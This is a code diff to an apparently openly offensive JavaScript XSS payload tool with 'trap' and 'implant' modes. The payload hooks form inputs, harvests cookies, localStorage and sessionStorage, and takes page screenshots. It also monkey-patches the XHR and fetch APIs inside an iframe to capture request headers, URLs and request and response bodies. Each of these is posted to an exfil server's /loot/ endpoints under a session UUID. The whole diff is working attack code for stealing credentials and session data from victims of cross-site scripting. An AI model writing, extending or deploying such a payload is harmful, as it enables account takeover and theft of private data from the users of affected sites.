@@ -6,6 +6,12 @@ function initGlobals()
 {
 	console.log("Initializing globals...");
 
+
+	// Create our own XHR/Fetch that won't get modified by monkeyPatching
+	window.taperXHR      = XMLHttpRequest;
+	window.originalFetch = window.fetch;
+
+
 	// Set to trap for iFrame trap, where
 	// the payload needs to try to keep it's
 	// own persistence. 
@@ -13,12 +19,12 @@ function initGlobals()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "implant";
+	window.taperMode = "trap";
 
 
 	if (window.taperMode === "trap")
 	{
-		// Ue fullscreen for actual prod usage
+		// Use fullscreen for actual prod usage
 		// not fullscreen shows the XSS laden landing
 
 		// page in the background so you can 
@@ -38,12 +44,9 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-		window.taperstartingPage = "https://127.0.0.1:8443/";
+		window.taperstartingPage = "http://targetapp.localdemo/wp-admin";
+		//window.taperstartingPage = "https://127.0.0.1:8443/";
 	}
-
-
-
 
 
 	// Exfil server
@@ -55,7 +58,7 @@ function initGlobals()
 	
 
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = true;
+	window.monkeyPatchAPIs = false;
 
 
 	// Should we capture a screenshot after a delay after an API call?
@@ -63,12 +66,6 @@ function initGlobals()
 	// the UI
 	window.postApiCallScreenshot = true;
 	window.screenshotDelay       = 1500;
-
-
-	// Create our own XHR that won't get modified by monkeyPatching
-	window.taperXHR = XMLHttpRequest;
-
-	window.originalFetch = window.fetch;
 
 
 	// Helpful variables
@@ -134,7 +131,7 @@ function sendScreenshot()
 
 	if (window.taperMode === "trap")
 	{
-		myReference = document.getElementById('iframe_a');
+		myReference = document.getElementById('iframe_a').contentDocument;
 	}
 	else
 	{
@@ -142,7 +139,7 @@ function sendScreenshot()
 	}
 
 	// html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
-	html2canvas(myReference.contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
+	html2canvas(myReference.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
 	{
 		function responseHandler() 
 		{
@@ -159,7 +156,8 @@ function sendScreenshot()
 
 
 		// Helps hide flashing of the page when clicking around
-		if (tapersetBackgroundImage)
+		// Only relevant to trap mode. 
+		if (window.tapersetBackgroundImage  && window.taperMode === "trap")
 		{
 			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
 			document.body.style.backgroundRepeat = "no-repeat";
@@ -189,7 +187,7 @@ function hookInputs()
 
 	if (window.taperMode === "trap")
 	{
-		myReference = document.getElementById("iframe_a");
+		myReference = document.getElementById("iframe_a").contentDocument;
 	}
 	else
 	{
@@ -197,7 +195,7 @@ function hookInputs()
 	}
 
 	// inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
-	inputs = myReference.contentDocument.getElementsByTagName('input');
+	inputs = myReference.getElementsByTagName('input');
 	for (index = 0; index < inputs.length; index++)
 	{
 		// Check to see if we've already hooked the input field. 
@@ -206,7 +204,7 @@ function hookInputs()
 		// like a page change, but maybe the actual URL didn't change. 
 		if (inputs[index].getAttribute("tappedState") != "true")
 		{
-			//console.log("!! Setting tappedState attribute on element index: " + index);
+			console.log("!! Setting tappedState attribute on element index: " + index);
 			inputs[index].setAttribute("tappedState", "true");
 
 			// Adding event listeners to fire when the value in submitted 
@@ -237,6 +235,7 @@ function hookInputs()
 // Only update backend if new cookie or value changed.
 function checkCookies()
 {
+	// console.log("Checking cookies...");
 	cookieArray = document.cookie.split(';');
 	for (index = 0; index < cookieArray.length; index++)
 	{
@@ -313,6 +312,8 @@ function checkCookies()
 // Only update backend if new data or value changed.
 function checkLocalStorage()
 {
+	// console.log("Checking local storage...");
+
 	for (index = 0; index < localStorage.length; index++)
 	{
 		key   = localStorage.key(index)
@@ -379,12 +380,12 @@ function checkLocalStorage()
 // Only update backend if new data or value changed.
 function checkSessionStorage()
 {
-	console.log("!!! Top of checkSessionStorage...");
+	// console.log("!!! Top of checkSessionStorage...");
 	for (index = 0; index < sessionStorage.length; index++)
 	{
 		key = sessionStorage.key(index)
 		value = sessionStorage.getItem(key)
-		console.log("~~~ Session storage: {" + key + ", " + value + "}");
+		// console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
 
 		if (key === "taperSessionStorage" || 
@@ -396,7 +397,7 @@ function checkSessionStorage()
 			key === "taperSessionUUID")
 		{
 			// Should skip over our own session storage for reporting
-			console.log("!!! Found taper data in session storage, hopefully SKIPPING");
+			// console.log("!!! Found taper data in session storage, hopefully SKIPPING");
 			continue;
 		}
 
@@ -405,39 +406,39 @@ function checkSessionStorage()
 
 		if (sessionStorage.getItem('taperSessionStorage').length > 0)
 		{
-			console.log("+++ taperSessionStorage has length...");
+			// console.log("+++ taperSessionStorage has length...");
 			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));
 
 			if (key in sessionStorageDict)
 			{
 				// Existing local storage key
-				console.log("!!! Existing sessionstorage key...");
+				// console.log("!!! Existing sessionstorage key...");
 				if (sessionStorageDict[key] != value)
 				{
 					// Existing localStorage, but the value has changed
-					console.log("     New sessionStorage value: " + value);
-					console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
+					// console.log("     New sessionStorage value: " + value);
+					// console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
 					sessionStorageDict[key] = value;
 				}
 				else
 				{
 					// Existing sessionStorage, but no change in value to report
-					console.log("     sessionStorage value unchanged");
+					// console.log("     sessionStorage value unchanged");
 					continue;
 				}
 			}
 		}
-		else
-		{
-			console.log("+++ In else statement for taperSessionStorage length check...");
-		}
+		// else
+		// {
+		// 	console.log("+++ In else statement for taperSessionStorage length check...");
+		// }
 
-		console.log("XXXX Wrapping up Session storage: {" + key + ", " + value + "}");
+		// console.log("XXXX Wrapping up Session storage: {" + key + ", " + value + "}");
 
 		sessionStorageDict[key] = value;
 
-		console.log("!!!! About to set session storage value to: " + JSON.stringify(sessionStorageDict))
-		console.log("Length of dict is: " + sessionStorageDict.length);
+		// console.log("!!!! About to set session storage value to: " + JSON.stringify(sessionStorageDict))
+		// console.log("Length of dict is: " + sessionStorageDict.length);
 		if (Object.keys(sessionStorageDict).length > 0)
 		{
 			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
@@ -477,6 +478,7 @@ function sendHTML()
 
 	trapURL  = myReference.contentDocument.location.href;
 	trapHTML = myReference.contentDocument.documentElement.outerHTML;
+
 
 	// request = new XMLHttpRequest();
 	request = new window.taperXHR();
@@ -522,6 +524,7 @@ function captureUrlChangeLoot()
 // iframe trap, not the one with the XSS vuln. 
 function runUpdate()
 {
+	// console.log("*** Top of runUpdate...");
 	var currentUrl = "";
 	var fullUrl = "";
 
@@ -669,47 +672,6 @@ function getFetchReference()
 
 
 
-// Check if the intercepted API call
-// is our own API calls back to return loot.
-// We shouldn't intercept our own XHR/Fetch calls. 
-// function isInterceptableHost(url)
-// {
-// 	console.log("** top of isInterceptableHost...");
-// 	try
-// 	{
-// 		urlHandler = new URL(url);
-// 		server = urlHandler.hostname;
-// 		port   = urlHandler.port;
-
-// 		destinationServer = "https://" + server + ":" + port;
-
-// 		console.log("URL Handler: " + destinationServer);
-
-// 		// We need to make sure we're not intercepting our own
-// 		// exfiltration calls, we're also using XHR
-// 		if (destinationServer != taperexfilServer)
-// 		{
-// 			console.log("Not our own api call, loot it!");
-// 			return true;
-// 		}
-// 		else
-// 		{
-// 			// It's our own API call, skip it
-// 			console.log("Skip this, it's our own API call");
-// 			return false;
-// 		}
-// 	}
-// 	catch (error)
-// 	{
-// 		// If URL failed, it's likely a local path,
-// 		// not a call to our own jstap server. Intercept it. 
-// 		console.log("XXXXXXXXX Partial path! Not our own api call, loot it: " + error);
-// 		console.log("---- url: " + url);
-// 		return true;
-// 	}
-// }
-
-
 
 // Fetch API wrapper for monkey patching
 function customFetch(url, options)
@@ -810,11 +772,10 @@ function customFetch(url, options)
 
 
 
-
-
-
 // Monkey patch API prototypes to intercept API calls
-function monkeyPatch()
+// Only works for Trap mode, all sorts of bad things 
+// happen when we try to do this in implant mode
+function monkeyPatchXHR()
 {
 	// console.log("** Enabling API monkey patches...");
 
@@ -824,18 +785,27 @@ function monkeyPatch()
 	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
 
 
+
 	//Monkey patch open
-	getXhrReference().prototype.open = async function(method, url, async, user, password) 
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
 		var url = arguments[1];
 
-		if (!this.noIntercept)
-		{
-			// Save for later
-			this._url = url;
-			this._method = method;
-		}
+		console.log("Intercepted XHR open: " + method + ", " + url);
+
+
+		// send loot
+		request = new XMLHttpRequest();
+		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + sessionStorage.getItem('taperSessionUUID'));
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+		var jsonObj = new Object();
+		jsonObj["method"] = method;
+		jsonObj["url"]    = url;
+		var jsonString    = JSON.stringify(jsonObj);
+		request.send(jsonString);
+
 
 		xhrOriginalOpen.apply(this, arguments);
 	}
@@ -843,138 +813,90 @@ function monkeyPatch()
 
 
 	// Monkey patch setRequestHeader
-	getXhrReference().prototype.setRequestHeader =  async function (header, value)
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.setRequestHeader = function (header, value)
 	{
 		var header = arguments[0];
 		var value  = arguments[1];
 
-		if (!this.noIntercept)
-		{
-			// Check if we already have the dictionary
-			if(!this.hasOwnProperty("_requestHeaders"))
-			{
-				// Create the dictionary property
-				this._requestHeaders = {};
-			}
+		// console.log("$$$ MonekeyURL: " + this.url);
 
-			// Save the header for later use
-			this._requestHeaders[header] = value;
-		}
+		console.log("Intercepted Header = " + header + ": " + value);
 
-	 	xhrOriginalSetHeader.apply(this, arguments);
+
+		request = new XMLHttpRequest();
+		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + sessionStorage.getItem('taperSessionUUID'));
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+		var jsonObj = new Object();
+		jsonObj["header"] = header;
+		jsonObj["value"]  = value;
+		var jsonString    = JSON.stringify(jsonObj);
+		request.send(jsonString);
+
+
+		xhrOriginalSetHeader.apply(this, arguments);
 	}
 
 
-  	// Monkey patch send, pull together all the loot
-	getXhrReference().prototype.send = function(data) 
+  	// Monkey patch send
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
 	{
-		if (!this.noIntercept)
+		console.log("Intercepted request body: " + data);
+
+		var requestBody = btoa(data);
+
+
+		this.onreadystatechange = function()
 		{
-			console.log("-----------------------------------------------");
-			console.log("Intercepted request body: " + data);
-
-			var requestBody = btoa(data);
-
-			// Let's get the other information we need
-			var url = this._url;
-			console.log("--- Intercepted url: " + url);
-
-			var method = this._method;
-			console.log("--- Intercepted method: " + method);
-
-			// Send off the open/setup data
-			// request = new window.taperXHR();
-			request = new XMLHttpRequest();
-			request.noIntercept = true;
-			request.open("POST", taperexfilServer + "/loot/xhrOpen/" + 
-				sessionStorage.getItem('taperSessionUUID'));
-			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-			var jsonObj = new Object();
-			jsonObj["method"] = method;
-			jsonObj["url"]    = url;
-			var jsonString    = JSON.stringify(jsonObj);
-			request.send(jsonString);
-
-
-
-			for (header in this._requestHeaders)
+			if (this.readyState === 4)
 			{
-				console.log("-- header: " + header + ", " + this._requestHeaders[header])
+				var data;
 
-				// Send off the header events
+				if (!this.responseType || this.responseType === "text") 
+				{
+					data = this.responseText;
+				} 
+				else if (this.responseType === "document") 
+				{
+					data = this.responseXML;
+				} 
+				else if (this.responseType === "json") 
+				{
+					data = JSON.stringify(this.response);
+				} 
+				else 
+				{
+					data = xhr.response;
+				}
+
+				var responseBody = btoa(data);
+				// var response = read_body(this);
+				console.log("Intercepted response: " + data);
+
 				request = new XMLHttpRequest();
-				request.noIntercept = true;
-				request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + 
-					sessionStorage.getItem('taperSessionUUID'));
+				request.open("POST", taperexfilServer + "/loot/xhrCall/" + sessionStorage.getItem('taperSessionUUID'));
 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
 				var jsonObj = new Object();
-				jsonObj["header"] = header;
-				jsonObj["value"]  = this._requestHeaders[header];
-				var jsonString    = JSON.stringify(jsonObj);
-			 	request.send(jsonString);
+				jsonObj["requestBody"]  = requestBody;
+				jsonObj["responseBody"] = responseBody;
+				var jsonString          = JSON.stringify(jsonObj);
+				request.send(jsonString);
 			}
-
-			console.log("** Intercepting...");
-			this.onreadystatechange = function()
-			{
-				if (this.readyState === 4)
-				{
-					var data;
-
-					if (!this.responseType || this.responseType === "text") 
-					{
-						data = this.responseText;
-					} 
-					else if (this.responseType === "document") 
-					{
-						data = this.responseXML;
-					} 
-					else if (this.responseType === "json") 
-					{
-						data = JSON.stringify(this.response);
-					} 
-					else 
-					{
-						data = xhr.response;
-					}
-
-					var responseBody = btoa(data);
-					console.log("--- Intercepted response: " + data);
-
-
-
-
-					request = new XMLHttpRequest();
-					request.noIntercept = true;
-					request.open("POST", taperexfilServer + "/loot/xhrCall/" + 
-						sessionStorage.getItem('taperSessionUUID'));
-					request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-					var jsonObj = new Object();
-					jsonObj["requestBody"]  = requestBody;
-					jsonObj["responseBody"] = responseBody;
-					var jsonString          = JSON.stringify(jsonObj);
-					request.send(jsonString);
-
-					// Check if we should take a screenshot now
-					if (window.postApiCallScreenshot)
-					{
-						setTimeout(sendScreenshot, window.screenshotDelay);
-					}
-				}
-			}
-		}
+		};
 
 		xhrOriginalSend.apply(this, arguments);
 	}
+}
 
 
 
 
-	// Now for the Fetch API
-	console.log("## Starting fetch monkey patching");
+
+
+function monkeyPatchFetch()
+{
+	// console.log("## Starting fetch monkey patching");
 	// Fetch API monkey patching
 	// const originalFetch = window.fetch;
 	getFetchReference().fetch = customFetch;
@@ -1019,12 +941,12 @@ function takeOver()
 
 		// Just register all the darned events, each event in the iframe
 		// we'll call runUpdate()
-		var myReference = document.getElementById('iframe_a');
+		var myReference = document.getElementById('iframe_a').contentDocument;
 	}
 	else
 	{
 		console.log("Starting implant mode!");
-		myReference = document.contentDocument;
+		myReference = document;
 	}
 
 	// Hook all the things
@@ -1037,7 +959,17 @@ function takeOver()
 	// Monkey patch underlaying API calls?
 	if (window.monkeyPatchAPIs)
 	{
-		monkeyPatch();
+		if (window.taperMode === "trap")
+		{
+			monkeyPatchXHR();
+			monkeyPatchFetch();
+		}
+		else
+		{
+			// Note that XHR monkeypatching 
+			// isn't working in implant mode
+			monkeyPatchFetch();
+		}
 	}
 }
 
